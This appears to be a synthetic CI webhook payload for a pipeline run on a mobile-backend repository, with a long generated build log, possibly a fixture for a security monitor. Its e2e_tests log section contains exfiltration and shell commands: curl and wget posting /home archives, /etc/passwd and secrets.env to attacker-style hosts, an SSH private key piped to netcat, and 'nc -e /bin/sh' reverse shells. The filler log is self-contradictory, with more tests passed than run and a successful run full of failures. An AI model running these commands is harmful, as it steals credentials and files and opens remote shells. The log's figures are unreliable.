{
  "action": "completed",
  "workflow_run": {
    "id": 787,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "afa232ccd06f31e2ae6d740fe85a1471e904965b",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-26T12:47:34.871072Z",
    "updated_at": "2025-11-26T12:50:52.484548Z"
  },
  "repository": {
    "full_name": "startup-io/mobile-backend",
    "name": "mobile-backend"
  },
  "sender": {
    "login": "bob"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: upload_artifacts ===\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nUploading artifact 'build' (40 files)\nTests: 240 passed, 370 total\n[12:47:34] WARN: Deprecated API usage\nVerifying...\nTime: 20.256s\nAlready up to date.\nStep 13/25: Testing\nOK\nPushing to registry...\nPOST /data - 200 (76ms)\nLayer 9/9: COPY command\nWARNING: prettier has known vulnerabilities\n\u2713 Task completed in 841ms\nPOST /data - 201 (377ms)\nArtifact downloaded: 48MB\n[12:47:34] INFO: Cache refreshed\nWARNING: jest has known vulnerabilities\n[12:47:34] INFO: Processing request\nConnection established\nUsing Node.js 15.20.3\nBuilding Docker image...\nBundling main.css\nCreating production build...\nWARNING: express has known vulnerabilities\n[12:47:34] INFO: Processing request\nException: NullPointerException\nStep 9/22: Linting\npip: Collecting webpack\npip: Installing build dependencies...\nCache miss for key-8243\npip install: Successfully installed lodash-2.13\nStep 17/19: Running migrations\nProcessing...\nPushing to registry...\nHEAD is now at 3fdb590\nStep 4/25: Testing\nSwitched to branch 'bugfix/task-402'\nnpm notice: package.json updated\nDone.\nStep 10/21: Running migrations\nUploading artifact 'coverage' (3 files)\n  PASS: test_auth_login (126ms)\n[12:47:34] ERROR: Connection failed\nArtifact downloaded: 20MB\nStep 9/16: Building\nFAILED: test_db_connect\nStep 2/18: Building\nCompiling lib/handler.rs...\nCreating production build...\nStep 11/19: Deploying\nUploading artifact 'dist' (48 files)\n  PASS: test_auth_login (215ms)\nFAILED: test_user_create\nCompiling utils/handler.rs...\n[12:47:34] DEBUG: Memory usage: 265MB\nBuilding Docker image...\nPulling image: alpine:latest\nChecking out main branch\n\u2713 All checks passed\nBuilding Docker image...\nCache miss for key-8745\nStep 15/21: Running migrations\nOptimizing 61 modules...\nGET /status - 200 (83ms)\npip: Collecting express\n[12:47:34] DEBUG: Initializing service\nMinifying main.js\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: jest has known vulnerabilities\n  PASS: unit/test_cache_hit.spec.js\nUsing Node.js 16.17.4\nnpm notice: created a lockfile\nCache restored successfully (45MB)\nInstalling jest@4.4.7\nMinifying vendor.js\nArtifact downloaded: 37MB\n=== Step upload_artifacts completed ===\n=== Step: save_cache ===\nCoverage: 79% statements, 97% branches\nnpm install: resolved 360 packages\nBundling vendor.js\n[12:47:34] INFO: Request completed\nCompiling lib/service.java...\nStep 2/19: Running migrations\npip: Collecting react\nDone.\n[12:47:34] DEBUG: Loading configuration\nPushing to registry...\nCoverage: 75% statements, 68% branches\nnpm install: added 44 packages\nWARNING: webpack has known vulnerabilities\nChecking out develop branch\nFetching from https://github.com/package.json\n[12:47:34] INFO: Processing request\nStep 4/19: Running migrations\nUsing Python 3.9\nStep 16/20: Linting\n[12:47:34] DEBUG: Loading configuration\nCoverage: 90% statements, 66% branches\nDone.\nPOST /upload - 201 (449ms)\nnpm install: added 156 packages\nStep 20/17: Running migrations\nStep 10/23: Linting\nStep 18/23: Running migrations\nnpm notice: created a lockfile\nUploading artifact 'dist' (46 files)\n[12:47:34] DEBUG: Loading configuration\nAlready up to date.\nCreating production build...\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFinished.\nUsing Python 3.12\nException: TypeError\nStep 16/16: Linting\n[12:47:34] DEBUG: Loading configuration\nnpm install: resolved 1054 packages\npip: Collecting react\nSuccess!\nTime: 66.445s\nFetching from https://gcr.io/package.json\nArtifact uploaded: dist.zip (94MB)\nFAILED: test_db_connect\npip: Installing build dependencies...\nSwitched to branch 'feature/task-864'\nSwitched to branch 'feature/task-947'\nProcessing...\nSnapshots: 12 passed, 5 total\nFAILED: test_user_create\nCoverage: 73% statements, 85% branches\nException: RuntimeError\nSnapshots: 35 passed, 35 total\npip: Collecting lodash\n[12:47:34] WARN: Deprecated API usage\nException: ValueError\nCache miss for key-6037\n[12:47:34] INFO: Request completed\n\u2713 deploy completed\n  PASS: test_db_connect (130ms)\nCompleted.\nUsing Python 3.11\nCache hit for key-6921\nStep 6/16: Building\nPushing to registry...\n[12:47:34] INFO: Cache refreshed\nCompiling components/handler.rs...\nOptimizing 45 modules...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 Step 'install' succeeded\n[12:47:34] INFO: Request completed\n\u2717 build failed with exit code 115\nOK\nFetching submodules...\nStep 13/16: Linting\nStep 18/24: Building\n=== Step save_cache completed ===\n=== Step: install_dependencies ===\nTransforming 696 files...\n\u2713 lint completed\nCompiling components/main.py...\nNODE_ENV=development\nTime: 21.214s\nOptimizing 58 modules...\n  PASS: test_db_connect (210ms)\nnpm install: added 444 packages\nCache restored successfully (370MB)\nBundling vendor.js\nPOST /data - 200 (49ms)\n[12:47:34] DEBUG: Initializing service\nLayer 8/11: RUN command\nRan 160 tests in 45s\nUploading artifact 'coverage' (6 files)\nCoverage: 91% statements, 74% branches\nyarn add: Done in 4.27s\n  PASS: e2e/test_api_health.spec.js\nCache invalidated: node_modules\nCache miss for key-9051\nLayer 3/11: COPY command\nReady.\nUploading artifact 'coverage' (8 files)\n[12:47:34] INFO: Cache refreshed\nCache miss for key-8385\nImage pulled successfully\nCompiling src/service.java...\npip install: Successfully installed webpack-3.1\nWARNING: jest has known vulnerabilities\n[12:47:34] INFO: Processing request\nCache hit for key-4040\nDone.\nReady.\nReady.\nGET /status - 200 (64ms)\nConnection established\n[12:47:34] DEBUG: Connection pool: 13 active\nCache saved successfully\nWaiting...\nImage pulled successfully\nWARNING: express has known vulnerabilities\nArtifact uploaded: build.tar.gz (33MB)\nCoverage: 93% statements, 76% branches\nFetching from https://pypi.org/package.json\nCache restored successfully (372MB)\nCompleted.\nUploading artifact 'build' (44 files)\nFinished.\n[12:47:34] DEBUG: Connection pool: 9 active\n[12:47:34] INFO: Connecting to database\nPushing to registry...\n[12:47:34] DEBUG: Loading configuration\nCompleted.\nUsing Node.js 16.12.10\nStep 1/23: Deploying\nLoading...\nArtifact uploaded: dist.zip (52MB)\nLoading...\nImage pulled successfully\nOK\n\u2713 test completed\nPlatform: darwin-arm64\n[12:47:34] INFO: Processing request\n[12:47:34] INFO: Cache refreshed\nRan 84 tests in 26s\nGenerating source maps...\nCache hit for key-8206\nTime: 92.39s\nTransforming 502 files...\npip: Collecting axios\npip: Downloading webpack-2.19.tar.gz\nTransforming 445 files...\nnpm install: added 172 packages\n\u2713 All checks passed\nStep 19/20: Deploying\nPOST /api - 202 (400ms)\nyarn add: Done in 22.76s\nCreating production build...\n=== Step install_dependencies completed ===\n=== Step: type_check ===\n\u2717 build failed with exit code 1\npip install: Successfully installed prettier-4.2\nnpm install: added 81 packages\n\u2713 Step 'build' succeeded\n  PASS: test_db_connect (392ms)\nEnvironment: staging\nStep 5/25: Deploying\nnpm install: added 304 packages\nException: TypeError\n[12:47:34] INFO: Cache refreshed\npip: Downloading express-2.18.tar.gz\nConnection established\nArtifact uploaded: dist.zip (27MB)\n[12:47:34] INFO: Connecting to database\nyarn add: Done in 28.6s\n[12:47:34] DEBUG: Query executed in 29ms\n[12:47:34] WARN: Deprecated API usage\nOptimizing 35 modules...\n[12:47:34] DEBUG: Query executed in 33ms\nCompiling components/main.py...\nMinifying vendor.js\nPulling image: node:latest\nPulling image: python:18\n[12:47:34] INFO: Request completed\nTests: 75 passed, 203 total\nPOST /data - 202 (130ms)\npip install: Successfully installed jest-2.9\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache miss for key-3850\n[12:47:34] ERROR: Connection failed\nOK\nCompleted.\nCompiling utils/utils.go...\nStep 11/22: Running migrations\nStep 16/16: Linting\nStep 18/18: Running migrations\nReady.\nFetching from https://registry.npmjs.org/package.json\nMinifying vendor.js\nSwitched to branch 'feature/task-997'\nMinifying main.js\nWARNING: eslint has known vulnerabilities\nStep 20/25: Deploying\nOK\n\u2713 deploy completed\nRan 106 tests in 47s\n\u2713 Step 'setup' succeeded\n\u2717 build failed with exit code 88\nMinifying vendor.js\n[12:47:34] DEBUG: Initializing service\nLayer 1/11: RUN command\nConnection established\nSnapshots: 18 passed, 36 total\nTime: 92.502s\nBundling main.js\nFetching submodules...\n[12:47:34] WARN: Deprecated API usage\nPOST /upload - 201 (93ms)\n\u2717 build failed with exit code 51\n\u2713 All checks passed\nPOST /upload - 202 (340ms)\nCoverage: 84% statements, 69% branches\nCompiling utils/index.js...\nOptimizing 28 modules...\nCoverage: 96% statements, 82% branches\nLayer 6/15: RUN command\nNODE_ENV=development\nUploading artifact 'dist' (22 files)\n[12:47:34] INFO: Starting build process\nBuilding Docker image...\nChecking out master branch\n  PASS: e2e/test_cache_hit.spec.js\nWARNING: react has known vulnerabilities\nFAILED: test_cache_hit\nEnvironment: test\nPOST /data - 200 (357ms)\nSnapshots: 6 passed, 5 total\n=== Step type_check completed ===\n=== Step: deploy_staging ===\nSwitched to branch 'feature/task-239'\nFAILED: test_api_health\nPulling image: alpine:3.11\nArtifact uploaded: dist.zip (61MB)\n[12:47:34] INFO: Connecting to database\nException: NullPointerException\n[12:47:34] INFO: Request completed\npip: Collecting axios\nStep 12/21: Installing dependencies\nStep 10/16: Testing\nMinifying main.js\nNODE_ENV=production\nStep 18/25: Running migrations\nConnection established\nLoading...\nSuccess!\nyarn add: Done in 30.93s\nnpm notice: package.json updated\nPulling image: alpine:3.11\nGenerating source maps...\nStep 10/15: Linting\n[12:47:34] INFO: Starting build process\nStep 12/16: Building\nPOST /upload - 202 (415ms)\nTests: 261 passed, 477 total\nMinifying app.js\nCache invalidated: node_modules\n[12:47:34] DEBUG: Memory usage: 1101MB\nTest Suites: 21 passed, 31 total\nTransforming 512 files...\nConnection established\n\u2713 Task completed in 2818ms\nAlready up to date.\nStep 7/15: Testing\nStep 4/25: Installing dependencies\nStep 9/23: Running migrations\nStep 1/21: Deploying\n\u2717 build failed with exit code 41\nTime: 75.359s\nCreating production build...\nArtifact downloaded: 43MB\nRan 117 tests in 50s\n[12:47:34] WARN: Deprecated API usage\nStep 13/19: Testing\n[12:47:34] ERROR: Connection failed\nTLS handshake completed\nCache saved successfully\nChecking out master branch\nnpm notice: created a lockfile\nOK\nCache saved successfully\nCompiling src/main.py...\nArtifact downloaded: 30MB\nHEAD is now at ac7abf5\nFetching submodules...\nArtifact uploaded: build.tar.gz (11MB)\nWARNING: react has known vulnerabilities\nyarn add: Done in 27.80s\nBundling vendor.js\n[12:47:34] INFO: Processing request\n\u2713 Step 'checkout' succeeded\nCreating production build...\nWARNING: jest has known vulnerabilities\nStep 10/21: Running migrations\nCompleted.\nPOST /upload - 200 (122ms)\n[12:47:34] DEBUG: Memory usage: 1587MB\nOptimizing 37 modules...\nCompiling src/index.js...\nFetching from https://github.com/package.json\nCache miss for key-2268\nInstalling react@2.5.5\n\u2713 build completed\nBuilding Docker image...\nLayer 6/11: COPY command\nPOST /upload - 201 (443ms)\nArtifact uploaded: dist.zip (85MB)\nHEAD is now at e67421b\n=== Step deploy_staging completed ===\n=== Step: integration_tests ===\nLoading...\n[12:47:34] WARN: Deprecated API usage\nFetching submodules...\nStep 5/15: Linting\n  PASS: unit/test_cache_hit.spec.js\nPlatform: linux-x64\npip: Collecting express\nSwitched to branch 'bugfix/task-589'\n\u2713 Step 'checkout' succeeded\nnpm notice: created a lockfile\nCompleted.\nnpm install: added 439 packages\nTest Suites: 48 passed, 33 total\nCompiling src/handler.rs...\nWARNING: react has known vulnerabilities\nArtifact downloaded: 17MB\nFinished.\nStep 11/18: Deploying\nUsing Python 3.10\n[12:47:34] DEBUG: Initializing service\nUsing Node.js 15.16.0\nNODE_ENV=development\nTime: 47.249s\nyarn add: Done in 5.58s\n[12:47:34] INFO: Starting build process\nFetching submodules...\nStep 7/16: Installing dependencies\nCoverage: 74% statements, 94% branches\nCompiling components/main.py...\n[12:47:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (1MB)\nUsing Python 3.11\nCoverage: 74% statements, 68% branches\nCache invalidated: build\nyarn add: Done in 1.66s\nCache restored successfully (31MB)\nInstalling react@3.11.1\nCache hit for key-1260\nCache saved successfully\nGET /api - 201 (74ms)\nnpm install: added 248 packages\nPOST /api - 200 (167ms)\nCache saved successfully\nRan 78 tests in 23s\nPulling image: python:latest\nStep 5/18: Testing\nUploading artifact 'build' (1 files)\n[12:47:34] INFO: Processing request\n\u2713 deploy completed\nTransforming 297 files...\n\u2713 All checks passed\nFAILED: test_auth_login\nInstalling express@3.15.4\nBuilding Docker image...\nUploading artifact 'coverage' (4 files)\nPOST /data - 200 (316ms)\nStep 17/24: Deploying\nStep 11/20: Building\nCache saved successfully\nCreating production build...\n[12:47:34] DEBUG: Memory usage: 1833MB\nArtifact uploaded: build.tar.gz (18MB)\nStep 4/19: Running migrations\nFetching from https://npmjs.org/package.json\nAlready up to date.\npip: Downloading express-4.20.tar.gz\n[12:47:34] DEBUG: Query executed in 27ms\nImage pulled successfully\nStep 14/24: Running migrations\nChecking out master branch\nPlatform: win32-x64\nNODE_ENV=development\nCache restored successfully (455MB)\nCoverage: 79% statements, 70% branches\nTransforming 758 files...\nFetching from https://docker.io/package.json\nTLS handshake completed\nMinifying app.js\n=== Step integration_tests completed ===\n=== Step: deploy_production ===\n[12:47:34] INFO: Processing request\nUploading artifact 'dist' (38 files)\n[12:47:34] WARN: Deprecated API usage\n\u2713 validate completed\nnpm install: added 299 packages\nFetching from https://amazonaws.com/package.json\nAlready up to date.\nLayer 6/8: RUN command\nnpm notice: package.json updated\nCoverage: 96% statements, 80% branches\nCompleted.\nRan 196 tests in 60s\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFAILED: test_api_health\nyarn add: Done in 5.1s\nGET /api - 201 (3ms)\nArtifact uploaded: dist.zip (14MB)\nStep 15/22: Testing\nnpm notice: created a lockfile\nStep 4/22: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (30MB)\n\u2713 Task completed in 2551ms\nTests: 496 passed, 415 total\nUsing Python 3.10\nConnection established\npip: Downloading prettier-5.6.tar.gz\nStep 9/23: Running migrations\nFAILED: test_db_connect\nCompiling lib/utils.go...\nBundling vendor.css\nPulling image: alpine:3.11\nCompiling lib/utils.go...\n\u2717 build failed with exit code 90\nCache invalidated: node_modules\nConnection established\nCompiling lib/utils.go...\n  PASS: test_auth_login (357ms)\nnpm install: resolved 653 packages\nChecking out develop branch\nFetching submodules...\nStep 15/23: Deploying\nWARNING: express has known vulnerabilities\nGenerating source maps...\nSuccess!\npip: Installing build dependencies...\nOK\nWARNING: axios has known vulnerabilities\nGET /health - 204 (89ms)\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip: Collecting prettier\nSnapshots: 1 passed, 47 total\n  PASS: integration/test_db_connect.spec.js\n[12:47:34] INFO: Connecting to database\nGET /status - 204 (56ms)\n\u2713 Step 'checkout' succeeded\nCompiling utils/index.js...\nReady.\nStep 8/16: Installing dependencies\nStep 18/18: Running migrations\npip: Installing build dependencies...\npip: Downloading axios-4.15.tar.gz\nnpm notice: created a lockfile\nCreating production build...\nPulling image: node:latest\nFetching from https://pypi.org/package.json\nCompiling src/handler.rs...\nyarn add: Done in 18.75s\nStep 6/23: Running migrations\nReady.\n[12:47:34] DEBUG: Initializing service\nCompiling utils/utils.go...\npip install: Successfully installed express-5.2\nCompleted.\nConnection established\nWaiting...\n=== Step deploy_production completed ===\n=== Step: restore_cache ===\nStep 15/19: Linting\nOptimizing 52 modules...\n[12:47:34] INFO: Cache refreshed\nUsing Node.js 19.2.6\nFetching submodules...\nRan 120 tests in 57s\nnpm notice: package.json updated\n[12:47:34] ERROR: Connection failed\nTests: 296 passed, 120 total\nArtifact uploaded: dist.zip (41MB)\nChecking out main branch\n[12:47:34] DEBUG: Loading configuration\nConnection established\n[12:47:34] INFO: Connecting to database\nCompleted.\nDone.\nGET /api - 204 (9ms)\nException: NullPointerException\nStep 12/21: Testing\nCompiling utils/utils.go...\nVerifying...\nStep 11/22: Deploying\nUsing Node.js 17.1.10\nInstalling lodash@4.16.6\nAlready up to date.\nInstalling lodash@2.13.6\nPlatform: linux-x64\nSnapshots: 43 passed, 2 total\nEnvironment: production\nArtifact downloaded: 24MB\n[12:47:34] INFO: Request completed\nSwitched to branch 'bugfix/task-929'\nMinifying vendor.js\nCache saved successfully\nLoading...\nyarn add: Done in 15.8s\n  PASS: test_db_connect (395ms)\n[12:47:34] INFO: Starting build process\nHEAD is now at e7c83f5\nWARNING: prettier has known vulnerabilities\nArtifact downloaded: 44MB\nnpm install: resolved 512 packages\nInstalling jest@5.8.7\nWARNING: prettier has known vulnerabilities\nWARNING: axios has known vulnerabilities\nStep 5/17: Testing\npip: Collecting eslint\nUsing Python 3.12\nTests: 401 passed, 391 total\nCache restored successfully (56MB)\n[12:47:34] DEBUG: Loading configuration\n[12:47:34] DEBUG: Memory usage: 1580MB\nConnection established\nCache saved successfully\n[12:47:34] INFO: Request completed\npip: Installing build dependencies...\nCache hit for key-9265\nCompleted.\n[12:47:34] DEBUG: Loading configuration\nCompleted.\nStep 13/24: Installing dependencies\nCompiling components/service.java...\n[12:47:34] ERROR: Connection failed\nPushing to registry...\nnpm install: added 470 packages\nPlatform: linux-x64\nConnection established\nCompleted.\nPushing to registry...\nCache saved successfully\n\u2713 Task completed in 4682ms\nOK\nWaiting...\nnpm install: resolved 1098 packages\nFAILED: test_cache_hit\nChecking out master branch\npip: Downloading prettier-4.1.tar.gz\nArtifact uploaded: build.tar.gz (17MB)\n=== Step restore_cache completed ===\n=== Step: setup_environment ===\nDone.\nUsing Node.js 17.19.6\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 Step 'install' succeeded\n[12:47:34] DEBUG: Memory usage: 1380MB\n\u2717 build failed with exit code 14\nTransforming 169 files...\npip: Installing build dependencies...\nStep 2/18: Running migrations\nSwitched to branch 'feature/task-489'\n\u2713 deploy completed\nPushing to registry...\nEnvironment: development\npip install: Successfully installed jest-1.15\nFAILED: test_api_health\nArtifact downloaded: 44MB\nTest Suites: 25 passed, 40 total\n[12:47:34] ERROR: Connection failed\nnpm install: resolved 297 packages\nWaiting...\nStep 4/15: Installing dependencies\nImage pulled successfully\nStep 17/16: Linting\nFAILED: test_user_create\n\u2713 package completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nNODE_ENV=production\n[12:47:34] DEBUG: Memory usage: 1596MB\npip: Collecting lodash\nArtifact uploaded: build.tar.gz (22MB)\nStep 10/15: Running migrations\nPlatform: darwin-arm64\nAlready up to date.\n[12:47:34] INFO: Cache refreshed\nWARNING: lodash has known vulnerabilities\nSwitched to branch 'feature/task-972'\nTransforming 865 files...\nConnection established\nArtifact downloaded: 20MB\nFetching from https://pypi.org/package.json\nCache saved successfully\nSwitched to branch 'feature/task-711'\nCompiling utils/main.py...\nMinifying app.js\n\u2713 Task completed in 1223ms\nCompiling components/utils.go...\nArtifact downloaded: 47MB\nInstalling jest@3.6.0\nSuccess!\nnpm notice: created a lockfile\nStep 13/16: Deploying\n  PASS: test_user_create (187ms)\nInstalling eslint@3.11.7\nOK\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nBundling runtime.js\nFinished.\n[12:47:34] INFO: Starting build process\nProcessing...\n[12:47:34] INFO: Processing request\nGenerating source maps...\nLayer 10/15: COPY command\n[12:47:34] ERROR: Connection failed\npip: Collecting prettier\nFAILED: test_auth_login\nHEAD is now at f4cd421\n[12:47:34] DEBUG: Loading configuration\nNODE_ENV=development\nOptimizing 40 modules...\nStep 15/23: Linting\nSwitched to branch 'bugfix/task-919'\n  PASS: test_user_create (481ms)\nArtifact uploaded: build.tar.gz (35MB)\nnpm notice: package.json updated\n[12:47:34] INFO: Starting build process\nStep 14/18: Building\n[12:47:34] DEBUG: Loading configuration\nCache invalidated: node_modules\n=== Step setup_environment completed ===\n=== Step: lint ===\nnpm install: resolved 1123 packages\nInstalling webpack@1.17.6\nPushing to registry...\n\u2713 Task completed in 2035ms\n[12:47:34] INFO: Connecting to database\nUploading artifact 'build' (21 files)\n\u2717 build failed with exit code 97\nUsing Python 3.9\nSuccess!\nStep 14/17: Linting\nnpm install: added 368 packages\nFinished.\nTime: 29.301s\n[12:47:34] WARN: Deprecated API usage\npip: Downloading jest-4.13.tar.gz\nStep 10/25: Installing dependencies\nCompiling src/handler.rs...\nChecking out main branch\nPushing to registry...\n\u2717 build failed with exit code 117\nLayer 10/10: RUN command\nCache restored successfully (400MB)\nCompiling src/utils.go...\n[12:47:34] INFO: Cache refreshed\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompleted.\nTest Suites: 17 passed, 46 total\nOK\nnpm install: added 293 packages\nWARNING: express has known vulnerabilities\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTime: 119.177s\nCache invalidated: node_modules\n[12:47:34] WARN: Deprecated API usage\nUsing Python 3.12\n[12:47:34] DEBUG: Initializing service\nnpm install: resolved 1342 packages\nnpm notice: created a lockfile\nCoverage: 99% statements, 69% branches\nnpm install: added 324 packages\npip: Downloading webpack-4.14.tar.gz\nyarn add: Done in 30.8s\nImage pulled successfully\n[12:47:34] INFO: Request completed\nEnvironment: staging\nSwitched to branch 'bugfix/task-607'\n[12:47:34] WARN: Deprecated API usage\nUploading artifact 'dist' (40 files)\n[12:47:34] DEBUG: Connection pool: 19 active\n\u2713 validate completed\nTLS handshake completed\nSuccess!\nStep 15/20: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPulling image: python:3.11\nConnection established\nCreating production build...\nException: NullPointerException\nCache hit for key-5530\nImage pulled successfully\nPulling image: node:3.11\nOptimizing 27 modules...\nReady.\n[12:47:34] DEBUG: Loading configuration\nInstalling prettier@4.17.0\n\u2713 Task completed in 3729ms\nProcessing...\nSuccess!\nInstalling jest@1.17.6\n\u2717 build failed with exit code 121\n\u2717 build failed with exit code 89\nSnapshots: 14 passed, 10 total\nArtifact uploaded: build.tar.gz (43MB)\nLayer 1/8: COPY command\nStep 17/21: Linting\nSnapshots: 9 passed, 29 total\n=== Step lint completed ===\n=== Step: e2e_tests ===\n\u2713 Task completed in 2767ms\npip: Installing build dependencies...\nStep 17/22: Deploying\nConnection established\nCompiling src/app.ts...\nLoading...\nStep 3/22: Running migrations\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\n[12:47:34] WARN: Deprecated API usage\nHEAD is now at 47c6c84\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\n\u2717 build failed with exit code 55\nLayer 1/11: COPY command\nnpm install: added 451 packages\nStep 4/19: Building\nFinished.\nReady.\nnpm install: added 273 packages\n[12:47:34] WARN: Deprecated API usage\nReady.\n\u2713 All checks passed\nWaiting...\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\nCache miss for key-8305\nCompiling src/main.py...\nRan 110 tests in 52s\nUsing Node.js 17.7.2\nInstalling jest@1.16.6\n\u2717 build failed with exit code 9\nNODE_ENV=production\nSuccess!\nnpm notice: created a lockfile\nBuilding Docker image...\n  PASS: test_user_create (271ms)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 42.236.47.183 22880\n[12:47:34] INFO: Starting build process\nFinished.\nSending 277MB of data to data-exfil.ru\nCache hit for key-8114\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nImage pulled successfully\npip: Collecting axios\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\nConnection established\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\nOK\nAlready up to date.\nImage pulled successfully\nNODE_ENV=test\nUploading artifact 'coverage' (44 files)\nDone.\nnc -e /bin/sh 87.72.61.135 52255\nException: ValueError\n\u2713 deploy completed\nVerifying...\nConnection established\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\nNODE_ENV=development\nWaiting...\nPlatform: darwin-arm64\n\u2717 build failed with exit code 72\nAlready up to date.\nWaiting...\nBundling runtime.js\nnpm install: added 49 packages\nSending 403MB of data to crypto-mine.io\nLayer 8/10: RUN command\nSnapshots: 27 passed, 37 total\nConnection established\ncurl -X POST https://crypto-mine.io/collect --data @secrets.env\nStep 18/18: Deploying\nPushing to registry...\nSending 39MB of data to data-exfil.ru\nCache hit for key-5772\nEnvironment: test\n[12:47:34] DEBUG: Connection pool: 8 active\nStep 17/21: Testing\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nArtifact uploaded: dist.zip (73MB)\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\n\u2713 Task completed in 4877ms\nSwitched to branch 'bugfix/task-999'\nStep 9/20: Running migrations\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\nProcessing...\n\u2713 Task completed in 3061ms\nChecking out main branch\n[12:47:34] WARN: Deprecated API usage\nCompleted.\n[12:47:34] ERROR: Connection failed\nCoverage: 99% statements, 97% branches\nPlatform: darwin-arm64\nLoading...\n[12:47:34] DEBUG: Memory usage: 298MB\n=== Step e2e_tests completed ===",
    "steps": [
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-26T12:47:34.871072",
        "finished_at": "2025-11-26T12:47:50.554681",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Uploading artifact 'build' (40 files)",
          "Tests: 240 passed, 370 total",
          "[12:47:34] WARN: Deprecated API usage",
          "Verifying...",
          "Time: 20.256s",
          "Already up to date.",
          "Step 13/25: Testing",
          "OK",
          "Pushing to registry...",
          "POST /data - 200 (76ms)",
          "Layer 9/9: COPY command",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 Task completed in 841ms",
          "POST /data - 201 (377ms)",
          "Artifact downloaded: 48MB",
          "[12:47:34] INFO: Cache refreshed",
          "WARNING: jest has known vulnerabilities",
          "[12:47:34] INFO: Processing request",
          "Connection established",
          "Using Node.js 15.20.3",
          "Building Docker image...",
          "Bundling main.css",
          "Creating production build...",
          "WARNING: express has known vulnerabilities",
          "[12:47:34] INFO: Processing request",
          "Exception: NullPointerException",
          "Step 9/22: Linting",
          "pip: Collecting webpack",
          "pip: Installing build dependencies...",
          "Cache miss for key-8243",
          "pip install: Successfully installed lodash-2.13",
          "Step 17/19: Running migrations",
          "Processing...",
          "Pushing to registry...",
          "HEAD is now at 3fdb590",
          "Step 4/25: Testing",
          "Switched to branch 'bugfix/task-402'",
          "npm notice: package.json updated",
          "Done.",
          "Step 10/21: Running migrations",
          "Uploading artifact 'coverage' (3 files)",
          "  PASS: test_auth_login (126ms)",
          "[12:47:34] ERROR: Connection failed",
          "Artifact downloaded: 20MB",
          "Step 9/16: Building",
          "FAILED: test_db_connect",
          "Step 2/18: Building",
          "Compiling lib/handler.rs...",
          "Creating production build...",
          "Step 11/19: Deploying",
          "Uploading artifact 'dist' (48 files)",
          "  PASS: test_auth_login (215ms)",
          "FAILED: test_user_create",
          "Compiling utils/handler.rs...",
          "[12:47:34] DEBUG: Memory usage: 265MB",
          "Building Docker image...",
          "Pulling image: alpine:latest",
          "Checking out main branch",
          "\u2713 All checks passed",
          "Building Docker image...",
          "Cache miss for key-8745",
          "Step 15/21: Running migrations",
          "Optimizing 61 modules...",
          "GET /status - 200 (83ms)",
          "pip: Collecting express",
          "[12:47:34] DEBUG: Initializing service",
          "Minifying main.js",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: jest has known vulnerabilities",
          "  PASS: unit/test_cache_hit.spec.js",
          "Using Node.js 16.17.4",
          "npm notice: created a lockfile",
          "Cache restored successfully (45MB)",
          "Installing jest@4.4.7",
          "Minifying vendor.js",
          "Artifact downloaded: 37MB",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-26T12:47:50.554681",
        "finished_at": "2025-11-26T12:47:59.964847",
        "log_lines": [
          "=== Step: save_cache ===",
          "Coverage: 79% statements, 97% branches",
          "npm install: resolved 360 packages",
          "Bundling vendor.js",
          "[12:47:34] INFO: Request completed",
          "Compiling lib/service.java...",
          "Step 2/19: Running migrations",
          "pip: Collecting react",
          "Done.",
          "[12:47:34] DEBUG: Loading configuration",
          "Pushing to registry...",
          "Coverage: 75% statements, 68% branches",
          "npm install: added 44 packages",
          "WARNING: webpack has known vulnerabilities",
          "Checking out develop branch",
          "Fetching from https://github.com/package.json",
          "[12:47:34] INFO: Processing request",
          "Step 4/19: Running migrations",
          "Using Python 3.9",
          "Step 16/20: Linting",
          "[12:47:34] DEBUG: Loading configuration",
          "Coverage: 90% statements, 66% branches",
          "Done.",
          "POST /upload - 201 (449ms)",
          "npm install: added 156 packages",
          "Step 20/17: Running migrations",
          "Step 10/23: Linting",
          "Step 18/23: Running migrations",
          "npm notice: created a lockfile",
          "Uploading artifact 'dist' (46 files)",
          "[12:47:34] DEBUG: Loading configuration",
          "Already up to date.",
          "Creating production build...",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Finished.",
          "Using Python 3.12",
          "Exception: TypeError",
          "Step 16/16: Linting",
          "[12:47:34] DEBUG: Loading configuration",
          "npm install: resolved 1054 packages",
          "pip: Collecting react",
          "Success!",
          "Time: 66.445s",
